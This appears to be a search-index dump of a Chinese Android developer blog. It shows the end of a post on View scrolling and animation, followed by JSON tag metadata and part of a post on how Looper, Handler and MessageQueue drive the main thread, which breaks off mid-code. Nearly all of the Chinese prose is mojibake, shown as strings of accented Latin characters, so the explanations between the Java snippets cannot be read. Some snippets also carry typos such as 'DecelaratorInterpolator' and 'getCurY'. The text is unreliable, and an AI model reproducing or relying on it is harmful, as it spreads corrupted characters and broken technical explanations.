åˆ›å»ºï¼Œä¹Ÿå¯ä»¥å†™åœ¨R.animæ–‡ä»¶å¤¹ä¸‹,ç”¨æ³•å¾ˆç®€å• ImageView image = (ImageView) findViewById(R.id.image); Animation hyperspaceJump = AnimationUtils.loadAnimation(this, R.anim.hyperspace_jump); image.startAnimation(hyperspaceJump); å±æ€§åŠ¨ç”»å¯ä»¥ä»£ç åˆ›å»ºï¼Œä¹Ÿå¯ä»¥å†™åœ¨R.animatoræ–‡ä»¶å¤¹ä¸‹,ç”¨æ³•: AnimatorSet set = (AnimatorSet) AnimatorInflater.loadAnimator(myContext, R.anim.property_animator); set.setTarget(myObject); set.start(); æ¨èä½¿ç”¨ViewPropertyAnimatorï¼Œè¿™æ˜¯ä¸€ä¸ªä½äºandroid.viewä¸‹é¢çš„classï¼Œæ„Ÿè§‰æ›´åƒæ˜¯ä¸€ä¸ªUtil,å¤§éƒ¨åˆ†çš„æ–¹æ³•éƒ½æ˜¯åœ¨API 12 ,API 14å¼•å…¥çš„ï¼Œå®é™…å¼€å‘ä¸­æ¨èä½¿ç”¨ViewCompat.animate() è¿”å›ä¸€ä¸ªViewPropertyAnimatorå¯¹è±¡ï¼Œçœå»äº†å¼€å‘è€…ç‰ˆæœ¬åˆ¤æ–­çš„éº»çƒ¦è¯­æ³•æ›´ä¸ºç®€å•ï¼š ViewCompat.animate(view).x(500).y(500).setDuration(5000).setInterpolator(new DecelaratorInterpolator()); //ä¸éœ€è¦è°ƒç”¨start() æ®è¯´è¿™ç§æ–¹å¼æ€§èƒ½æœ€å¥½ï¼ŒGoogleå®˜æ–¹å¼ºçƒˆæ¨è,å‚è€ƒDevByteã€‚å¦å¤–ï¼Œæ®è¯´å¤§éƒ¨åˆ†Googleçš„Appä½¿ç”¨çš„éƒ½æ˜¯DecelaratorInterpolatorï¼Œå½“ç„¶è¿™è·Ÿè®¾è®¡æœ‰å…³ã€‚ 8.ä½¿ç”¨Scrollerå®ç°smoothScrollViewæœ‰ä¸€ä¸ªæ–¹æ³•computeScroll(),å¤å†™ï¼Œåƒè¿™æ ·å°±å¯ä»¥äº† Scroller scroller = new Scroller(mContext); private void smoothScrollTo(int dstX, int dstY) { int scrollX = getScrollX(); int delta = dstX - scrollX; scroller.startScroll(scrollX, 0, delta, 0, 1000); invalidate(); } @Override public void computeScroll() { if (scroller.computeScrollOffset()) { scrollTo(scroller.getCurrX(), scroller.getCurY()); postInvalidate(); } } 9. è¡¥å……å‡ ä¸ªå¥½ç©çš„å‡½æ•°View.canScrollVertically(int) public static boolean canChildScrollUp(View view) { if (android.os.Build.VERSION.SDK_INT &lt; 14) { if (view instanceof AbsListView) { final AbsListView absListView = (AbsListView) view; return absListView.getChildCount() &gt; 0 &amp;&amp; (absListView.getFirstVisiblePosition() &gt; 0 || absListView.getChildAt(0) .getTop() &lt; absListView.getPaddingTop()); } else { return view.getScrollY() &gt; 0; } } else { return view.canScrollVertically(-1); } } è¿™æ®µæ˜¯æˆ‘åœ¨ç§‹ç™¾ä¸‡çš„android-ultra-pulltorefreshé‡Œé¢æ‰¾åˆ°çš„ï¼Œæƒ³å½“åˆä¸ºäº†è‡ªå·±å†™ä¸‹æ‹‰åˆ·æ–°ï¼Œä¸€éä¸€éçš„æ‰“Logï¼Œæœ€åç”šè‡³ç”¨ä¸ŠgetVisibleRectæ‰ç®—æå®šã€‚å…¶å®å¾ˆå¤šä¸œè¥¿å‰äººå·²ç»å¸®æˆ‘ä»¬æ•´ç†å¥½äº†ã€‚å¯¹äº†è¿™ä¸œè¥¿åœ¨v4åŒ…é‡Œæœ‰ViewCompat.canScrollVerticallyï¼Œv4åŒ…é™¤äº†æ–¹æ³•æ•°æœ‰ç‚¹å¤š(10k+å¥½åƒ)è¿™ç‚¹ä¸å¥½ä»¥å¤–ï¼Œä¸€ç›´éƒ½å¾ˆå¥½ç”¨é™„ä¸ŠsupportLibraryå„ä¸ªåŒ…çš„æ–¹æ³•æ•°ï¼Œå¦‚æœå¯¹65536è¿™ä¸ªæ•°å­—ç†Ÿæ‚‰çš„è¯ï¼Œè¿˜æ˜¯ä¼šæ³¨æ„ç‚¹çš„ã€‚ æ€»ç»“ ä½¿ç”¨getLocalVisibleRectå¯ä»¥åˆ¤æ–­ä¸€ä¸ªviewæ˜¯å¦å®Œå…¨å¯è§ scrollBy,setScrollXç­‰å†…éƒ¨éƒ½æ˜¯è°ƒç”¨äº†scrollToæ–¹æ³•ï¼ŒScrollToæ–¹æ³•ä¼ å‚æ•°ä¸å®é™…æ•ˆæœæ˜¯ç›¸åçš„ updatesAndroid device Monitoré‡Œé¢æœ‰ä¸€ä¸ªDump UI Hierarchy for UI Automatorï¼Œç›´æ¥æŸ¥çœ‹è§†å›¾å±‚çº§ Reference Androidåº”ç”¨åæ ‡ç³»ç»Ÿå…¨é¢è¯¦è§£ â€‹[å¦‚ä½•å–å¾—Viewçš„ä½ç½®ä¹‹View.getLocationInWindow()çš„å°ç§˜å¯†](http://blog.csdn.net/imyfriend/article/details/8564781 è¯¦è§£å®ç°Androidä¸­å®ç°Viewæ»‘åŠ¨çš„å‡ ç§æ–¹å¼","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"TouchEvent","slug":"TouchEvent","permalink":"https://haldir65.github.io/tags/TouchEvent/"}]},{"title":"ä¸»çº¿ç¨‹çš„å·¥ä½œåŸç†","date":"2016-10-12T16:47:42.000Z","path":"2016/10/12/2016-10-12-How-the-mainThread-work/","text":"â€‹ ä»Šå¤©çªç„¶æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜: â€œHandlerçš„postDelayedä¼šé˜»å¡çº¿ç¨‹å—ï¼Ÿâ€ã€‚åŸºäºè‡ªå·±ä¹‹å‰å¯¹äºHandlerçš„çº¿ç¨‹é—´é€šè®¯æœºåˆ¶çš„ç†è§£ï¼Œè¿˜æ˜¯ä¸èƒ½ç»™å‡ºæ˜ç¡®çš„ç­”æ¡ˆã€‚æ­£å¥½æ‰“ç®—æŠŠä¸€ç¯‡å…³äºä¸»çº¿ç¨‹çš„å·¥ä½œåŸç†çš„æ–‡ç« å†™å‡ºæ¥ï¼Œé¡ºå¸¦çœ‹ä¸‹èƒ½å¦æŠŠè¿™ä¸ªé—®é¢˜ä»æºç çš„è§’åº¦è§£é‡Šæ¸…æ¥šã€‚ 1. ä»çº¿ç¨‹ï¼ˆThreadï¼‰å¼€å§‹é€šå¸¸ï¼Œä¸€ä¸ªProcessä¼šæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹, è€Œåœ¨Androidä¸­ï¼ŒUIæ§ä»¶ç›¸å…³çš„æ–¹æ³•å’Œä¸€äº›ç³»ç»Ÿcallbackéƒ½ä¼šå‘ç”Ÿåœ¨ä¸»çº¿ç¨‹ä¸Š(onResume,onCreate,onStartCommand,onDraw, etc)ã€‚ å¦‚æœAppä¸­ä½¿ç”¨äº†å¤šä¸ªProcessï¼Œåˆ™æ¯ä¸ªProcesséƒ½ä¼šæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œä½†è¿™ä¸æ˜¯ä»Šå¤©çš„é‡ç‚¹ã€‚Androidåº”ç”¨æ˜¯å¦‚ä½•å¯åŠ¨çš„?å¯åŠ¨ä¸€ä¸ªåº”ç”¨æ—¶ï¼Œç³»ç»Ÿä¼šä»Zygote Process forkå‡ºä¸€ä¸ªæ–°çš„Processï¼Œæœ€ç»ˆèµ°åˆ°ActivityThread çš„mainæ–¹æ³• public static void main(String[] args) { //çœç•¥éƒ¨åˆ†æ— å…³ä»£ç  Looper.prepareMainLooper(); ActivityThread thread = new ActivityThread(); thread.attach(false); if (sMainThreadHandler == null) { sMainThreadHandler = thread.getHandler(); } // End of event ActivityThreadMain. Looper.loop(); throw new RuntimeException(&quot;Main thread loop unexpectedly exited&quot;);//ä»è¿™é‡Œå¯ä»¥çŒœåˆ°Looper.loopæ–¹æ³•ä¼šä¸€ç›´æ‰§è¡Œä¸‹å» } çœ‹ä¸€ä¸‹Looper.prepareMainLooper()æ–¹æ³•ï¼š /** * Initialize the current thread as a looper, marking it as an * application&#39;s main looper. The main looper for your application * is created by the Android environment, so you should never need * to call this function yourself. See also: {@link #prepare()} */ public static void prepareMainLooper() { prepare(false); synchronized (Looper.class) { if (sMainLooper != null) { throw new IllegalStateException(&quot;The main Looper has already been prepared.&quot;); } sMainLooper = myLooper(); } } å¤§è‡´æ„æ€å°±æ˜¯ä¸ºå½“å‰Threadæ·»åŠ ä¸€ä¸ªLooperã€‚Looper.javaæ˜¯ä¸€ä¸ªæ™®é€šçš„classï¼Œå…¶å¤§è‡´ä½œç”¨å°±æ˜¯ä¸ºå½“å‰Threadç»´æŒä¸€ä¸ªmessage loopï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ªThreadå¹¶æ²¡æœ‰ä¸€ä¸ªLooperï¼Œè¦æƒ³æ·»åŠ ä¸€ä¸ªï¼Œéœ€è¦åœ¨è¯¥çº¿ç¨‹ä¸­è°ƒç”¨Looper.prepare()ï¼Œç„¶åè°ƒç”¨Looper.loop()æ–¹æ³•å³å¯è®©æ¶ˆæ¯å¾ªç¯ä¸€ç›´æŒç»­ä¸‹å»ã€‚å¤§éƒ¨åˆ†å’Œmessage Loopçš„äº¤äº’éƒ½æ˜¯é€šè¿‡Handlerè¿™ä¸ªç±»æ¥è¿›è¡Œçš„ã€‚ä¾‹å¦‚ class LooperThread extends Thread { public Handler mHandler; public void run() { Looper.prepare(); mHandler = new Handler() { public void handleMessage(Message msg) { // åœ¨è¿™é‡Œå¤„ç†æ¶ˆæ¯ } }; Looper.loop(); //è¿™é‡Œé¢å‘é€æ¶ˆæ¯ } } LooperæŒæœ‰ä¸€ä¸ªMessageQueue(æ¶ˆæ¯é˜Ÿåˆ—)æˆå‘˜å˜é‡ï¼Œæ¶ˆæ¯å¾ªç¯æ—¶ï¼ŒLooperå°±ä¸æ–­åœ°ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ‹¿å‡ºæ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚ä¸‹é¢æ¥çœ‹Looper.loop()æ–¹æ³•é‡Œæ‰€åšçš„äº‹ï¼š /** åˆ é™¤äº†éƒ¨åˆ†ä¸ç›¸å…³çš„ä»£ç  * Run the message queue in this thread. Be sure to call * {@link #quit()} to end the loop. */ public static void loop() { final Looper me = myLooper();//è¿”å›å½“å‰çº¿ç¨‹ä¸­å¯¹åº”çš„Looperï¼Œçœ‹çœ‹ä¸‹é¢çš„Exceptionå°±çŸ¥é“äº† if (me == null) { throw new RuntimeException(&quot;No Looper; Looper.prepare() wasn&#39;t called on this thread.&quot;); } final MessageQueue queue = me.mQueue; for (;;) { Message msg = queue.next(); // might block if (msg == null) { // No message indicates that the message queue is quitting. return; } try { msg.target.dispatchMessage(msg); } finally { //....çœç•¥ } } } ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ–°çš„æ¶ˆæ¯(msg)ã€‚äº¤ç»™msg.target.dispatchMessage(msg)è¿™ä¸ªtrargetæ˜¯ä¸ªHandleræ¥çœ‹ä¸‹Handleré‡Œé¢çš„dispatchMessageæ–¹æ³• /** * Handle system messages here. */ public void dispatchMessage(Message msg) { if (msg.callback != null) { handleCallback(msg); } else { if (mCallback != null) { if (mCallback.handleMessage(msg)) { return; } } handleMessage(msg); } } å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªeither or çš„è¿‡ç¨‹ï¼šMessageè¿™ä¸ªç±»é‡Œé¢æœ‰ä¸ªRunnable callbackï¼Œå¦‚æœè¿™ä¸ªmessageæœ‰callbackçš„è¯ï¼Œå°±æ‰§è¡Œè¿™ä¸ªrunnableï¼Œå¦åˆ™æ‰§è¡Œhandler.callBack.handleMessageã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„ Handler handler = new Handler(){ @Override public void handleMessage(Message msg) { super.handleMessage(msg); } }; è¿™ç§å†…éƒ¨ç±»çš„å½¢å¼äº†éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMessageæœ€å¥½ä¸è¦ç”¨newï¼Œä½¿ç”¨obtainæ–¹æ³•è·å¾—ï¼Œä½¿ç”¨releaseæ–¹æ³•é‡Šæ”¾ï¼Œè¿™é‡Œé¢æœ‰ä¸€ä¸ªæ¶ˆæ¯æ± çš„æ¦‚å¿µï¼Œæˆ‘ä¹Ÿä¸å¤ªç†è§£ã€‚MessageQueueä¸­æ²¡æœ‰å¤ªå¤šçš„å…¬å…±æ–¹æ³•ï¼Œå…¶ä¸­next()æ–¹æ³•ä¼šè¿”å› message that should be processed. Will not return message that will be processed at future times.Messageæœ‰ä¸€ä¸ªlongç±»å‹çš„å˜é‡Message.whenï¼ŒæŒ‡çš„æ˜¯è¿™æ¡æ¶ˆæ¯æœ€æ—©å¯ä»¥è¢«æ‰§è¡Œçš„æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´æ˜¯åŸºäºSystemClock.uptimeMills()çš„ã€‚æ‰€ä»¥å¦‚æœæ¶ˆæ¯é˜Ÿåˆ—ä¸­æ²¡æœ‰ä¸€æ¡messageåˆ°è¾¾è‡ªå·±çš„å¯æ‰§è¡Œæ—¶é—´, è¿™ä¸ªnext()æ–¹æ³•å°±ä¼šä¸€ç›´blockã€‚å€¼å¾—æ³¨æ„çš„æ˜¯SystemClock.uptimeMillsæ˜¯åŸºäºCPUæ´»åŠ¨æ—¶é—´çš„ï¼Œå¦‚æœcpuå¤„äºsleepçŠ¶æ€ï¼Œè¿™ä¸ªsleepæ—¶é—´æ˜¯ä¸ç®—çš„ã€‚æ‰€ä»¥å¦‚æœä½ postDelayedäº†10sï¼Œå‡è®¾cpu5såå¼€å§‹ä¼‘çœ ï¼Œ10såé†’æ¥ï¼Œç¡çœ çš„è¿™æ®µæ—¶é—´æ˜¯ä¸ç®—çš„ã€‚æ‰€ä»¥çœŸæ­£æ‰§è¡Œçš„æ—¶é—´å¯èƒ½è¿˜ä¼šå¾€åå»¶è¿Ÿã€‚ 2. HandlerHandleråŸºæœ¬ä¸Šå°±åšä¸¤ä»¶äº‹ add message to the messageQueue of the Looper itâ€™s associated with post() //æŠŠä¸€æ¡æ¶ˆæ¯æ·»åŠ åˆ°æ‰€æœ‰å¯ä»¥è¢«æ‰§è¡Œçš„æ¶ˆæ¯çš„æœ€åé¢ï¼Œä½†åœ¨è¿˜æ²¡åˆ°æ—¶é—´çš„æ¶ˆæ¯çš„å‰é¢ postDelayed()/postAtTime() //ä¸€ä¸ªç›¸å¯¹æ—¶é—´ï¼Œä¸€ä¸ªç»å¯¹æ—¶é—´ postAtFrontOfQueue() // @piwai æ’é˜Ÿè¡Œä¸ºï¼Œä¸è¦ç”¨ Handle message when this message doesnâ€™t have callbackHandlerçš„æ„é€ æ–¹æ³•æœ‰7ä¸ª,åˆå§‹åŒ–æ—¶éœ€è¦è·å¾—ä¸€ä¸ªLooperå¸¸ç”¨çš„Handler handler = new Handler() ä¼šåˆ›å»ºä¸€ä¸ªåŸºäºå½“å‰çº¿ç¨‹çš„Looperçš„Handler,å¦‚æœå½“å‰çº¿ç¨‹æ²¡æœ‰è°ƒç”¨Looper.Prepareï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œè¿™äº›åœ¨æºä»£ç é‡Œéƒ½èƒ½çœ‹åˆ°ã€‚ä¸€äº›å¥½ç”¨çš„æ„é€ å‡½æ•° Handler (Looper.getMainLooper()) //å¾€ä¸»çº¿ç¨‹çš„Looperçš„æ¶ˆæ¯é˜Ÿåˆ—é‡Œå‘æ¶ˆæ¯Hanlder(Looper.myLooper()) //å¾€å½“å‰çº¿ç¨‹Looperçš„æ¶ˆæ¯é˜Ÿåˆ—é‡Œæ·»åŠ æ¶ˆæ¯ Choreographerä½¿ç”¨Android studioæ—¶ï¼Œç»å¸¸ä¼šåœ¨Logcaté‡Œçœ‹åˆ°è¿™æ ·çš„ info: Skipped 60 frames! The application may be doing too much work on its main thread è¿™æ®µlogå‡ºè‡ªChreographer ï¼Œå¤§æ„å°±æ˜¯ä¸»çº¿ç¨‹ä¸Šåšçš„äº‹å¤ªå¤šæˆ–è€…åšäº†å¤ªå¤šä¸è¯¥åœ¨ä¸»çº¿ç¨‹ä¸Šåšçš„äº‹ã€‚è‡³äºä¸ºä»€ä¹ˆä¸è¦åœ¨ä¸»çº¿ç¨‹ä¸Šåšå¤ªå¤šçš„äº‹ï¼Œæ¥çœ‹çœ‹ä¸»çº¿ç¨‹éƒ½æœ‰å“ªäº›å·¥ä½œ:System Events , Input Events ,Application callback ,Services, Alarm ,UI Drawingâ€¦.å¦å¤–ï¼Œå½“å±å¹•å†…å®¹å‘ç”Ÿå˜åŒ–ï¼Œæˆ–è€…åœ¨Animationè¿è¡Œä¸­ï¼Œç³»ç»Ÿå°†ä¼šå°è¯•æ¯éš”16msæ¥Draw a Frameã€‚è€Œè¿™éƒ¨åˆ†å·¥ä½œæ˜¯ç”±Choregrapheræ¥å®Œæˆçš„ï¼Œè€Œå…¶å†…éƒ¨æ˜¯é€šè¿‡ä¸€ä¸ªHandleræ¥è¿›è¡ŒFrameæ›´æ–°çš„ã€‚ FrameHandler mHandler = new FrameHandler(Looper.myLooper()); Message msg = mHandler.obtainMessage(MSG_DO_FRAME); msg.setAsynchronous(true); mHandler.sendMessageAtTime(msg,nextFrameTime) private final class FrameHandler extends Handler { public FrameHandler(Looper looper) { super(looper); } @Override public void handleMessage(Message msg) { switch (msg.what) { case MSG_DO_FRAME: doFrame(System.nanoTime(), 0); break; case MSG_DO_SCHEDULE_VSYNC: doScheduleVsync(); break; case MSG_DO_SCHEDULE_CALLBACK: doScheduleCallback(msg.arg1); break; } } } å‡è®¾ä½ åœ¨onMeasure,onLayout,onDrawè¿™äº›æ–¹æ³•ä¸­è€½è¯¯ä¸»çº¿ç¨‹å¤ªå¤šæ—¶é—´ï¼ŒChoregrapherå°†ä¸èƒ½åŠæ—¶çš„æ›´æ–°Frameï¼Œå“ªæ€•ä½ åªè€½è¯¯äº†1msï¼Œç³»ç»Ÿä¹Ÿåªèƒ½åœ¨16ms(å¤§çº¦)ä¹‹åæ‰èƒ½æ›´æ–°ä¸‹ä¸€Frameã€‚ 3. ä¸ºäº†åœ¨å¼€å‘ä¸­å‘ç°ä¸åº”è¯¥åœ¨ä¸»çº¿ç¨‹ä¸­è¿›è¡Œçš„æ“ä½œ(IOï¼Œç½‘ç»œ)ï¼Œå¯ä»¥ä½¿ç”¨StrictModeï¼šif (BuildConfig.DEBUG) { StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder() .detectDiskReads() .detectDiskWrites() .detectNetwork() // or .detectAll() for all detectable problems .penaltyLog() .build()); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .detectLeakedSqlLiteObjects() .detectLeakedClosableObjects() .penaltyLog() .penaltyDeath() .build()); } 4 .Activity LifeCycle Events Activity LifeCycle Events(startActivity(), finishi()) go out of your process through Binder IPC to the ActivityManager //æœ‰æ—¶å€™startActivityå¯åŠ¨çš„Activityä¸æ˜¯è‡ªå·±Processçš„,æ¯”å¦‚è°ƒç”¨ç³»ç»Ÿç›¸æœºè¿™ç§ Then back on to your main queue in the form of lifeCycle callbacks(onCreate(),onDestory() et_al) // å¼‚æ­¥ï¼Œå¼‚æ­¥ï¼ æœ€åå›åˆ°æ–‡ç« å¼€å¤´çš„é‚£ä¸ªé—®é¢˜ï¼šHandler.postDelayä¼šé˜»å¡çº¿ç¨‹å—ï¼Ÿç­”æ¡ˆåœ¨è¿™é‡Œæ‰¾åˆ°äº†postDelayedæœ¬èº«å°±æ˜¯æŠŠä¸€æ¡æ¶ˆæ¯æ¨è¿Ÿåˆ°ç›¸å¯¹æ—¶é—´å¤šä¹…ä¹‹åã€‚å…³é”®åœ¨Looperå–å‡ºè¿™æ¡æ¶ˆæ¯æ—¶ï¼Œç”¨çš„æ˜¯ Message msg = queue.next(); // might block æ³¨é‡Šå·²ç»æš—ç¤ºäº†å¯èƒ½ä¼šé˜»å¡ï¼Œçœ‹ä¸‹nextæ–¹æ³•åšäº†ä»€ä¹ˆ: Message next() { .....çœç•¥ for (;;) { if (nextPollTimeoutMillis != 0) { Binder.flushPendingCommands(); } nativePollOnce(ptr, nextPollTimeoutMillis); synchronized (this) { // Try to retrieve the next message. Return if found. final long now = SystemClock.uptimeMillis(); Message prevMsg = null; Message msg = mMessages; if (msg != null &amp;&amp; msg.target == null) { // Stalled by a barrier. Find the next asynchronous message in the queue. do { prevMsg = msg; msg = msg.next; } while (msg != null &amp;&amp; !msg.isAsynchronous()); } if (msg != null) { if (now &lt; msg.when) { // Next message is not ready. Set a timeout to wake up when it is ready. nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); } else { // Got a message. mBlocked = false; if (prevMsg != null) { prevMsg.next = msg.next; } else { mMessages = msg.next; } msg.next = null; msg.markInUse(); return msg; } } else { // No more messages. nextPollTimeoutMillis = -1; } } } //....çœç•¥éƒ¨åˆ† } é¦–å…ˆè¿›æ¥ è°ƒç”¨äº†nativePollOnce(ptr,nextPollTimeoutMillis);è¿™æ˜¯ä¸ªnativeæ–¹æ³•ï¼Œç±»ä¼¼äºçº¿ç¨‹çš„waitæ–¹æ³•ï¼Œä¸è¿‡ä½¿ç”¨äº†Nativeçš„æ–¹æ³•ä¼šæ›´åŠ ç²¾å‡†ã€‚å¯ä»¥è®¤ä¸ºæ˜¯ç”¨nativeæ–¹æ³•è®©è¿™ä¸ªqueue.nextçš„æ–¹æ³•è€—æ—¶å»¶é•¿äº†ï¼Œæ‰€ä»¥returnæ—¶è¿”å›çš„Messageä¹Ÿå°±æ»¡è¶³åˆé€‚çš„æ—¶é—´ã€‚å¾€ä¸‹çœ‹ // Next message is not ready. Set a timeout to wake up when it is ready. nextPollTimeoutMillis = (int) Math.min(msg.when - now, Integer.MAX_VALUE); ä½†è¿™é‡Œçš„å µå¡å¹¶éå ç”¨CPUèµ„æºè¿™åŸºæœ¬æ˜¯ä¸€ä¸ªç±»ä¼¼ç”Ÿäº§è€…æ¶ˆè´¹è€…çš„æ¨¡å‹ï¼Œç®€å•è¯´å¦‚æœåœ¨ä¸»çº¿ç¨‹çš„MessageQueueæ²¡æœ‰æ¶ˆæ¯æ—¶ï¼Œå°±ä¼šé˜»å¡åœ¨loopçš„queue.next()æ–¹æ³•é‡Œï¼Œè¿™æ—¶å€™ä¸»çº¿ç¨‹ä¼šé‡Šæ”¾CPUèµ„æºè¿›å…¥ä¼‘çœ çŠ¶æ€ï¼Œç›´åˆ°æœ‰ä¸‹ä¸ªæ¶ˆæ¯è¿›æ¥æ—¶å€™å°±ä¼šå”¤é†’ä¸»çº¿ç¨‹ï¼Œåœ¨2.2 ç‰ˆæœ¬ä»¥å‰ï¼Œè¿™å¥—æœºåˆ¶æ˜¯ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„çº¿ç¨‹çš„waitå’Œnotify æ¥å®ç°çš„ï¼Œä¹‹åçš„ç‰ˆæœ¬æ¶‰åŠåˆ°Linux pipe/epollæœºåˆ¶ï¼Œé€šè¿‡å¾€pipeç®¡é“å†™ç«¯å†™å…¥æ•°æ®æ¥å”¤é†’ä¸»çº¿ç¨‹å·¥ä½œã€‚åŸç†ç±»ä¼¼äºI/O,è¯»å†™æ˜¯å µå¡çš„ï¼Œä¸å ç”¨CPUèµ„æºã€‚ nativePollOnce(ptr, nextPollTimeoutMillis);å‡½æ•°çš„è°ƒç”¨ã€‚çº¿ç¨‹ä¼šè¢«é˜»å¡åœ¨è¿™ä¸ªåœ°æ–¹ã€‚è¿™ä¸ªnativeæ–¹æ³•ä¼šè°ƒç”¨åˆ°åº•å±‚çš„JNIå‡½æ•°android_os_MessageQueue_nativePollOnce()ï¼Œè¿›ä¸€æ­¥è°ƒç”¨c/c++å±‚çš„nativeMessageQueueçš„pollOnce()å‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­åˆä¼šé€šè¿‡æœ¬çº¿ç¨‹åœ¨åº•å±‚çš„Looperçš„pollOnce()å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨pollInner()å‡½æ•°ã€‚åœ¨pollInner()å‡½æ•°ä¸­ä¼šè°ƒç”¨epoll_wait()å‡½æ•°(è¿™ä¸ªå‡½æ•°ä¸å µå¡)å¯¹åº”nativePollOnceçš„è¿˜æœ‰nativeWakeï¼Œå°±æ˜¯è¡¨æ˜pipeå†™ç«¯æœ‰writeäº‹ä»¶å‘ç”Ÿï¼Œä»è€Œè®©epoll_wait()é€€å‡ºç­‰å¾…ã€‚ javaå±‚çš„MessageQueueæŒæœ‰çš„mPtrå®é™…ä¸Šæ˜¯nativeInitï¼Œä¹Ÿå°±æ˜¯NativeMessageQueueçš„æŒ‡é’ˆ,è¿™æ ·ä¹Ÿæ–¹ä¾¿åé¢nativeDestory ä¸»çº¿ç¨‹ï¼ˆUIçº¿ç¨‹ï¼‰æ‰§è¡Œåˆ°è¿™ä¸€æ­¥å°±è¿›å…¥äº†æ­»å¾ªç¯ï¼Œä¸æ–­åœ°å»æ‹¿æ¶ˆæ¯é˜Ÿåˆ—é‡Œé¢çš„æ¶ˆæ¯å‡ºæ¥å¤„ç†ï¼Ÿé‚£ä¹ˆé—®é¢˜æ¥äº†1ã€UIçº¿ç¨‹ä¸€ç›´åœ¨è¿™ä¸ªå¾ªç¯é‡Œè·³ä¸å‡ºæ¥ï¼Œä¸»çº¿ç¨‹ä¸ä¼šå› ä¸ºLooper.loop()é‡Œçš„æ­»å¾ªç¯å¡æ­»å—ï¼Œé‚£è¿˜æ€ä¹ˆæ‰§è¡Œå…¶ä»–çš„æ“ä½œå‘¢ï¼Ÿ åœ¨looperå¯åŠ¨åï¼Œä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œçš„ä»»ä½•ä»£ç éƒ½æ˜¯è¢«looperä»æ¶ˆæ¯é˜Ÿåˆ—é‡Œå–å‡ºæ¥æ‰§è¡Œçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸»çº¿ç¨‹ä¹‹åéƒ½æ˜¯é€šè¿‡å…¶ä»–çº¿ç¨‹ç»™å®ƒå‘æ¶ˆæ¯æ¥å®ç°æ‰§è¡Œå…¶ä»–æ“ä½œçš„ã€‚ç”Ÿå‘½å‘¨æœŸçš„å›è°ƒä¹Ÿæ˜¯å¦‚æ­¤çš„ï¼Œç³»ç»ŸæœåŠ¡ActivityManagerServiceé€šè¿‡Binderå‘é€IPCè°ƒç”¨ç»™APPè¿›ç¨‹ï¼ŒAppè¿›ç¨‹æ¥åˆ°åˆ°è°ƒç”¨åï¼Œé€šè¿‡Appè¿›ç¨‹çš„Binderçº¿ç¨‹ç»™ä¸»çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—æ’å…¥ä¸€æ¡æ¶ˆæ¯æ¥å®ç°çš„ã€‚2ã€ä¸»çº¿ç¨‹æ˜¯UIçº¿ç¨‹å’Œç”¨æˆ·äº¤äº’çš„çº¿ç¨‹ï¼Œä¼˜å…ˆçº§åº”è¯¥å¾ˆé«˜ï¼Œä¸»çº¿ç¨‹çš„æ­»å¾ªç¯ä¸€ç›´è¿è¡Œæ˜¯ä¸æ˜¯ä¼šç‰¹åˆ«æ¶ˆè€—CPUèµ„æºå—ï¼ŸAppè¿›ç¨‹çš„å…¶ä»–çº¿ç¨‹æ€ä¹ˆåŠï¼Ÿ è¿™åŸºæœ¬æ˜¯ä¸€ä¸ªç±»ä¼¼ç”Ÿäº§è€…æ¶ˆè´¹è€…çš„æ¨¡å‹ï¼Œç®€å•è¯´å¦‚æœåœ¨ä¸»çº¿ç¨‹çš„MessageQueueæ²¡æœ‰æ¶ˆæ¯æ—¶ï¼Œå°±ä¼šé˜»å¡åœ¨loopçš„queue.next()æ–¹æ³•é‡Œï¼Œè¿™æ—¶å€™ä¸»çº¿ç¨‹ä¼šé‡Šæ”¾CPUèµ„æºè¿›å…¥ä¼‘çœ çŠ¶æ€ï¼Œç›´åˆ°æœ‰ä¸‹ä¸ªæ¶ˆæ¯è¿›æ¥æ—¶å€™å°±ä¼šå”¤é†’ä¸»çº¿ç¨‹ï¼Œåœ¨2.2 ç‰ˆæœ¬ä»¥å‰ï¼Œè¿™å¥—æœºåˆ¶æ˜¯ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„çº¿ç¨‹çš„waitå’Œnotify æ¥å®ç°çš„ï¼Œä¹‹åçš„ç‰ˆæœ¬æ¶‰åŠåˆ°Linux pipe/epollæœºåˆ¶ï¼Œé€šè¿‡å¾€pipeç®¡é“å†™ç«¯å†™å…¥æ•°æ®æ¥å”¤é†’ä¸»çº¿ç¨‹å·¥ä½œã€‚åŸç†ç±»ä¼¼äºI/O,è¯»å†™æ˜¯å µå¡çš„ï¼Œä¸å ç”¨CPUèµ„æºã€‚ æ‰€ä»¥ç¡®å®æ˜¯blockedäº†ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€ä»postDelayed(r,10)å¼€å§‹ï¼Œæ¥ä¸‹æ¥çš„10mså°±çœŸçš„å®Œå…¨å µå¡äº†(queue.nexté˜»å¡)PostDelayedæœ€ç»ˆä¼šè°ƒç”¨åˆ°enqueMessageæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹: synchronized (this) { if (mQuitting) { IllegalStateException e = new IllegalStateException( msg.target + &quot; sending message to a Handler on a dead thread&quot;); Log.w(TAG, e.getMessage(), e); msg.recycle(); return false; } msg.markInUse(); msg.when = when; 